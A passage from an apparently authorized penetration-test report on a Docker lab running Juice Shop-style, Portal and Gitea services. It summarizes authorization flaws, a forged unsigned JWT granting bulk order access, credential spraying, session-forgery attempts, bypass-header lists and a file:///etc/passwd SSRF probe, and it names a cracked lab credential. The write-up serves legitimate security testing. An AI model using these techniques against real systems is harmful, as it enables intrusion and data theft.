authenticated `Recycles` POST created null-owner records, and Recycles PUT/DELETE returned token-validation errors. A later complete generated API table coverage matrix tested 21 endpoint names across unauthenticated, customer, and admin contexts. It found 10 unauthenticated `200` routes, most already covered as public products/challenges/delivery/feedback/quantity/security-question behavior, and a distinct unauthenticated recycle-record BOLA documented as F-62. A reversible delivery-method mutation follow-up then checked `PUT /api/Deliverys/1` unauthenticated, customer, and admin contexts; all returned existing SPA stack traces and the final delivery object matched the baseline with no marker. A later track-order probe created disposable orders and confirmed unauthenticated plus cross-user order tracking disclosure, documented as F-50. Evidence is saved in `workspace/scans/docker-apex-misc-route-matrix-probes.csv`, `workspace/scans/docker-apex-misc-route-matrix-summary.txt`, `workspace/scans/docker-apex-continue-code-apply-probes.csv`, `workspace/scans/docker-apex-continue-code-apply-summary.txt`, `workspace/scans/docker-apex-product-quantity-mutation-probes.csv`, `workspace/scans/docker-apex-product-quantity-mutation-summary.txt`, `workspace/scans/docker-apex-generated-api-mutation-probes.csv`, `workspace/scans/docker-apex-generated-api-mutation-summary.txt`, `workspace/scans/docker-apex-generated-api-table-coverage-probes.csv`, `workspace/scans/docker-apex-generated-api-table-coverage-summary.txt`, `workspace/scans/docker-apex-recycles-bola-probes.csv`, `workspace/scans/docker-apex-recycles-bola-summary.txt`, `workspace/scans/docker-apex-delivery-mutation-probes.csv`, `workspace/scans/docker-apex-delivery-mutation-summary.txt`, `workspace/scans/docker-apex-track-order-nosql-probes.csv`, and `workspace/scans/docker-apex-track-order-nosql-summary.txt`.
- **Apex Web3/chatbot routes were probed by context:** unauthenticated, admin, testing-admin, deluxe, and disposable customer contexts were tested against `/rest/chatbot/*` and `/rest/web3/*` routes extracted from the frontend. Chatbot replies stayed gated for unauthenticated users; authenticated unknown chatbot actions timed out; corrected conversation probing used the replacement JWT returned by `setname` and confirmed the coupon disclosure in F-47. Lazy-loaded Web3 chunks were reviewed locally: the sandbox, wallet, and bee-haven flows mostly use browser MetaMask/Sepolia interactions and only the already known `/rest/web3/*` lab backend routes. Unauthenticated `/rest/web3/nftUnlocked` returned `{"status":false}`. A later endpoint matrix and isolated follow-up confirmed unauthenticated Web3 listener setup through `nftMintListen` and `walletExploitAddress`, plus unsafe `502` handling for malformed Web3 control inputs; this is documented as F-40. Public feedback seed exposure tied to the Web3/NFT flow is documented separately as F-48. Evidence is saved in `workspace/scans/docker-apex-web3-chatbot-probes.csv`, `workspace/scans/docker-apex-web3-chatbot-summary.txt`, `workspace/scans/docker-apex-chatbot-conversation-probes.csv`, `workspace/scans/docker-apex-chatbot-conversation-summary.txt`, `workspace/scans/docker-apex-web3-endpoint-matrix-probes.csv`, `workspace/scans/docker-apex-web3-endpoint-matrix-summary.txt`, `workspace/scans/docker-apex-web3-post-followup.txt`, and `workspace/scans/docker-apex-public-wallet-seed-summary.txt`.
- **Apex track-order and accounting order-history follow-ups stayed inside the lab:** `/rest/track-order/:id` was tested with encoded and double-encoded URLs for Apex, Customer API, DevOps Hub, loopback Apex ports, and `file:///etc/passwd`. Encoded values were reflected as order IDs rather than fetched; slash-unencoded variants hit Angular route errors and added no new impact beyond existing verbose stack-trace coverage. A separate probe created two disposable orders and tested encoded JSON/operator, bracket, query-string, and POST body shapes; those payloads reflected as literal order IDs or returned `500` responses, and did not return multiple orders. The same run did prove unauthenticated and cross-user order lookup by valid ID, documented as F-50. A later accounting order-history matrix showed `/rest/order-history/orders` blocks unauthenticated, customer, and legitimate admin contexts, but accepts a forged unsigned `accounting` role JWT and returns bulk order data; this is documented as F-60. Evidence is saved in `workspace/scans/docker-apex-ssrf-track-order-probes.csv`, `workspace/scans/docker-apex-ssrf-track-order-summary.txt`, `workspace/scans/docker-apex-track-order-nosql-probes.csv`, `workspace/scans/docker-apex-track-order-nosql-summary.txt`, `workspace/scans/docker-apex-accounting-order-history-probes.csv`, and `workspace/scans/docker-apex-accounting-order-history-summary.txt`.
- **Cross-service CORS behavior was tested:** a Docker matrix sent `Origin: https://attacker.example` plus GET/OPTIONS requests to sensitive Portal, Customer API, Apex, and Gitea endpoints. Apex returned wildcard CORS on sensitive public APIs and broad preflight methods/headers, documented as F-42. Portal, Customer API, and Gitea did not return permissive CORS headers on the tested sensitive endpoints. Evidence is saved in `workspace/scans/docker-cors-matrix.csv` and `workspace/scans/docker-cors-matrix-summary.txt`.
- **Gitea anonymous and authenticated API surfaces were enumerated:** anonymous users search exposes `developer`, repo search returns the four public repos, and branch/commit/content APIs expose metadata for each repo. Extended Docker probing covered recursive trees, raw files, archive downloads, repo subscribers, public settings, Swagger, wiki routes, package endpoints, collaborator/key/team endpoints, issues, pull requests, releases, labels, and milestones. It confirmed Gitea `1.21.11`; issues/pulls/releases/labels/milestones were empty for all four repos; packages required auth; collaborator/key/team endpoints did not disclose sensitive content; public settings/Swagger exposed generic instance metadata only. Follow-up inspection confirmed `workspace/loot/wiki-repos` contains no cloned files because wiki clone attempts failed for all four repos, and `workspace/scans/docker-gitea-noncode-summary.txt` records empty issues/releases. A later Docker credential matrix found `developer / developer123` authenticates to `/api/v1/user`; read-only authenticated follow-up showed that account has `admin`, `pull`, and `push` permissions on all four repos but no additional orgs, teams, keys, notifications, issues, pulls, releases, repo keys, or hooks in the tested read endpoints. This is documented as F-57. Evidence is saved in `workspace/scans/docker-gitea-anonymous-surface-probes.csv`, `workspace/scans/docker-gitea-anonymous-surface-summary.txt`, `workspace/scans/docker-gitea-extended-surface-probes.csv`, `workspace/scans/docker-gitea-extended-surface-summary.txt`, `workspace/scans/docker-gitea-noncode-summary.txt`, `workspace/scans/docker-gitea-auth-probes.csv`, `workspace/scans/docker-gitea-auth-summary.txt`, `workspace/scans/docker-gitea-developer-followup-probes.csv`, and `workspace/scans/docker-gitea-developer-followup-summary.txt`.
- **Portal session behavior was checked:** GET `/portal/auth` and failed POST `/portal/auth` did not set session cookies; `/portal/tools/upload` redirects unauthenticated GET/POST/HEAD to `/portal/auth?next=/portal/tools/upload`; OPTIONS returns allowed methods only. Evidence is saved in `workspace/scans/docker-portal-session-method-check.txt`.
- **Portal auth-bypass and public-static classes were probed:** SQLi-style login payloads, platform-ops clue variants, trusted identity headers (`X-Forwarded-User`, `X-Remote-User`, `Remote-User`, `X-Auth-User`, `X-User`, `X-Forwarded-Email`), reverse-proxy override headers (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Uri`, `X-Forwarded-Prefix`, `X-Script-Name`, `X-Accel-Redirect`), local-IP headers, simple user/session cookie tampering, path normalization, static traversal, alternate HTTP methods, and `next` parameter variants did not bypass authentication. The only `200` responses were the login page; protected upload either redirected to auth, rendered the sign-in page after redirects, returned `404` for malformed path variants, or returned `405` for unsupported methods. A static follow-up fetched `/portal/auth` and `/static/css/style.css`; it found no JavaScript or hidden form fields, but did confirm F-41 internal wiki/file-share/contact disclosure. Evidence is saved in `workspace/scans/docker-portal-auth-gap-probes.csv`, `workspace/scans/docker-portal-auth-gap-summary.txt`, `workspace/scans/docker-portal-proxy-header-method-followup.txt`, and `workspace/scans/docker-portal-static-followup-summary.txt`.
- **Portal login behavior and headers were sampled:** 48 login attempts across known/clue-derived usernames and passwords all returned `401` with identical response length `1568`, and 20 repeated invalid attempts did not produce a visible lockout/throttle response. Portal's login response had `X-Frame-Options: SAMEORIGIN` but missed HSTS, CSP, `X-Content-Type-Options`, Referrer-Policy, and Permissions-Policy; this was recorded as hardening context rather than a standalone finding because no Portal XSS or authenticated sensitive page was reached. Evidence is saved in `workspace/scans/docker-portal-login-behavior.csv`, `workspace/scans/docker-security-header-matrix.csv`, and `workspace/scans/docker-portal-headers-login-behavior-summary.txt`.
- **Portal credential follow-up used newly cracked and newly discovered credentials:** 143 combinations built from cracked Apex credentials, platform-ops clues, and repo secrets produced 0 successful Portal logins. After F-57 found `developer / developer123` on Gitea, a separate Docker follow-up tested that credential and related usernames against Portal form and JSON login variants; all 48 attempts returned `401`, with 0 success hints. A later artifact-derived expansion extracted users and password-like tokens from current `loot`, `scans`, and `notes`, skipped 263 previously attempted pairs, and tested the top 1,000 new pairs against `/portal/auth?next=/portal/tools/upload`; all returned `401` with 0 upload redirects. After the Bender credential and deleted-product probe introduced new lab-derived passwords, a bounded 40-attempt form-login follow-up against `/portal/auth?next=/portal/tools/upload` also returned only `401`, with 0 success hints. Evidence is saved in `workspace/scans/docker-portal-cracked-credential-followup.csv`, `workspace/scans/docker-portal-cracked-credential-followup-summary.txt`, `workspace/scans/docker-portal-gitea-credential-followup.csv`, `workspace/scans/docker-portal-gitea-credential-followup-summary.txt`, `workspace/scans/docker-portal-artifact-credential-expansion.csv`, `workspace/scans/docker-portal-artifact-credential-expansion-summary.txt`, `workspace/scans/docker-portal-new-credential-followup.csv`, and `workspace/scans/docker-portal-new-credential-followup-summary.txt`.
- **Portal alternate login parameter/content-type matrix was tested:** 1,152 Docker-toolbox POST attempts across `/portal/auth` and `/portal/auth?next=/portal/tools/upload`, form and JSON bodies, `username/password`, `user/pass`, and `email/password` field sets, and lab-derived users/passwords all returned `401`. No tested combination produced a protected upload redirect, session cookie, or authenticated page marker. Evidence is saved in `workspace/scans/docker-portal-parameter-credential-matrix.csv` and `workspace/scans/docker-portal-parameter-credential-matrix-summary.txt`.
- **Portal login rendering was tested for reflected injection and redirect behavior:** Docker-toolbox requests covered crafted `next`, `error`, username, and password values containing harmless script-tag, event-handler, quote-breakout, Jinja arithmetic, external URL, protocol-relative URL, and protected-path payloads. The tested cases returned only `200` login pages or `401` failed-login pages, with no raw HTML/script reflection, no template arithmetic evaluation, no debug/template error, no `Set-Cookie`, and no external redirect. Evidence is saved in `workspace/scans/docker-portal-login-rendering-probes.csv` and `workspace/scans/docker-portal-login-rendering-summary.txt`.
- **Portal debug/config/source exposure was probed:** 178 Docker-toolbox requests covered Flask/Werkzeug debug paths, config/source files, `.git`, static backup/source-map variants, leaked log paths, simple cookie/header auth shapes, and upload JSON/multipart edge cases. The only new reachable route was unauthenticated `GET /healthz`, which returned only `ok`; POST was `405`, and OPTIONS allowed `HEAD, OPTIONS, GET`. Debug/config/source/log paths returned the standard 404, and upload stayed behind the auth redirect before processing tested bodies. Evidence is saved in `workspace/scans/docker-portal-surface-probes.csv`, `workspace/scans/docker-portal-surface-summary.txt`, and `workspace/scans/docker-portal-healthz-followup.txt`.
- **Portal Flask-style session forgery smoke test was run:** 30 forged signed-cookie attempts against `/portal/tools/upload` used the most likely lab-derived secrets (`secret`, `acme`, `portal`, `platform-ops`, and the leaked Vault token) with common `platform-ops` session payload keys and compressed/uncompressed Flask cookie body formats. All returned `302` to authentication, with 0 authenticated upload markers. A later bounded auth-variant matrix tested 618 additional cases against the same protected upload route: likely Flask/itsdangerous session cookies with plausible lab secrets, alternate cookie names, unsigned JWT cookies and bearer-style headers, trusted auth-header combinations, and Basic auth using high-signal lab credentials. Every case returned `302` to `/portal/auth?next=/portal/tools/upload`, with 0 authenticated-content hints. Evidence is saved in `workspace/scans/docker-portal-session-forgery-probes.csv`, `workspace/scans/docker-portal-session-forgery-summary.txt`, `workspace/scans/docker-portal-auth-variant-probes.csv`, and `workspace/scans/docker-portal-auth-variant-summary.txt`.
- **Portal credential-source audit was expanded across cloned repository working trees and full Git history:** targeted searches covered Portal terms, platform-ops clues, human names, Vault/LDAP/config references, and the deeper secret-rotation runbook at `workspace/loot/repos/secrets-rotation-log/docs/runbooks/secret-rotation.md`. This did not reveal a direct Portal password, session secret, or upload-tool credential beyond already known clues: `jdoe`, `jsmith`, `platform-ops@acme.internal`, the decoy Vault token, Vault paths, anonymous LDAP host/base-DN notes, and service credentials already documented in F-02. Those user/password sources were exercised by the Docker Portal login matrices and the artifact-derived expansion: `workspace/scans/docker-portal-login-behavior.csv`, `workspace/scans/docker-portal-credential-probe.csv`, `workspace/scans/docker-portal-cracked-credential-followup.csv`, `workspace/scans/docker-portal-parameter-credential-matrix.csv`, and `workspace/scans/docker-portal-artifact-credential-expansion-summary.txt`, all with 0 successful Portal logins.
- **Findings were validated, not inferred:** each confirmed finding has live request/response evidence or direct repository evidence.
- **Negative checks were recorded:** direct internal hostnames returned `unknown service`; portal SQLi, reused Customer API credentials, cracked Apex credentials, and the newly found Gitea `developer / developer123` credential did not authenticate to the portal; Docker portal probing found no additional authenticated route access beyond protected `/portal/tools/upload`; a targeted Docker portal credential pass tested 99 lab-derived username/password combinations without success in `workspace/scans/docker-portal-credential-probe.csv`; Customer API admin-only delete correctly rejected a normal token.

Remaining uncertainty is mostly in deeper chained exploitation, full cracking of `incident-support.kdbx` beyond the 3,023,421 tested focused/lab/evidence-derived candidates, portal authenticated functionality, and full Juice Shop challenge completion. Portal remains the largest blind spot because authenticated dashboard/tool behavior could not be reached with the lab-derived credential set tested so far.

## Recommended Next Steps

1. Continue portal-specific work inside Docker only: inspect routes, credentials, session handling, and authenticated tools if credentials or an auth bypass are found. Current targeted Docker credential evidence includes 99 initial lab-derived combinations, 143 cracked/secret-derived follow-up combinations, and a 1,152-attempt alternate field/content-type matrix, all with 0 successes.
2. Continue KeePass analysis for `incident-support.kdbx` using lab-local/Docker-local tooling only if genuinely new candidate sources are found. The current Docker-local check tested 3,023,421 focused, lab-derived, and refreshed incremental evidence-derived candidates and did not open it.
3. Complete targeted Apex challenge paths only where they produce new business-impact findings, not just duplicate Juice Shop exercises.
4. Preserve evidence snapshots under `workspace/scans` and `workspace/loot`, then produce a final cleaned report with request/response excerpts and remediation.
